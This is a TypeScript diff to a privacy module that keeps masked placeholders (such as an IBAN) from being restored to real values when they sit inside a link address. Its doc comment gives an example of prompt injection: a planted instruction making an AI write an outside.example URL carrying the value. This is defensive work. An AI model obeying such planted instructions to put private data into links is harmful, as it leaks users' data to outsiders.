@@ -75,10 +75,41 @@ export function applyPlaceholders(
   return { masked: masked + text.slice(cursor), counts };
 }
 
-/** Puts the real values back in place of known placeholders; unknown ones are left as written. */
-export function restorePlaceholders(text: string, values: ReadonlyMap<string, string>): string {
+/**
+ * Puts the real values back in place of known placeholders; unknown ones are left as written.
+ * A placeholder inside a link's address stays a placeholder: an instruction planted in a document could
+ * otherwise make the AI write "https://outside.example/?d=[IBAN_1]" and one click would send the real
+ * value away. `before` is the text that came just before (streamed answers), for the same check.
+ */
+export function restorePlaceholders(text: string, values: ReadonlyMap<string, string>, before = ""): string {
   if (values.size === 0) return text;
-  return text.replace(PLACEHOLDER_PATTERN, (placeholder) => values.get(placeholder) ?? placeholder);
+  return text.replace(PLACEHOLDER_PATTERN, (placeholder: string, _kind: string, _n: string, offset: number) => {
+    const value = values.get(placeholder);
+    if (value === undefined) return placeholder;
+    return insideLinkAddress(lineBefore(before, text, offset)) ? placeholder : value;
+  });
+}
+
+/** The text of the current line up to `offset` (only the part after the last line break matters). */
+function lineBefore(before: string, text: string, offset: number): string {
+  const inText = text.lastIndexOf("\n", offset - 1);
+  if (inText !== -1) return text.slice(inText + 1, offset);
+  return before.slice(before.lastIndexOf("\n") + 1) + text.slice(0, offset);
+}
+
+/**
+ * Whether text written right after `line` belongs to a link's address: a web address, a "mailto:",
+ * a Markdown link destination "](…" or "](<…" or a reference definition "[1]: <…". Plain string
+ * searches only (no pattern that could take long on a very long line).
+ */
+export function insideLinkAddress(line: string): boolean {
+  let start = line.length;
+  while (start > 0 && !/\s/.test(line[start - 1])) start--;
+  const word = line.slice(start).toLowerCase();
+  if (word.includes("://") || word.includes("](") || word.includes("mailto:") || word.includes("www.")) return true;
+  const open = line.lastIndexOf("<");
+  if (open === -1 || line.indexOf(">", open) !== -1) return false;
+  return line.slice(Math.max(0, open - 2), open) === "](" || /^[a-z][a-z0-9+.-]{0,31}:/i.test(line.slice(open + 1, open + 40)) || /^\s*\[[^\]]{1,200}\]:\s*$/.test(line.slice(0, open));
 }
 
 /**
@@ -97,6 +128,8 @@ export function neutralizePlaceholders(text: string, keep?: ReadonlySet<string>)
  */
 export class StreamRestorer {
   private buffer = "";
+  /** The current line as the model wrote it (with placeholders), to recognise a link's address. */
+  private line = "";
 
   /** `neutralizeOthers`: placeholders without a value here are made inert, so they cannot be restored later. */
   constructor(
@@ -105,7 +138,9 @@ export class StreamRestorer {
   ) {}
 
   private restore(text: string): string {
-    const restored = restorePlaceholders(text, this.values);
+    const restored = restorePlaceholders(text, this.values, this.line);
+    const lastBreak = text.lastIndexOf("\n");
+    this.line = lastBreak === -1 ? this.line + text : text.slice(lastBreak + 1);
     return this.neutralizeOthers ? neutralizePlaceholders(restored) : restored;
   }
 
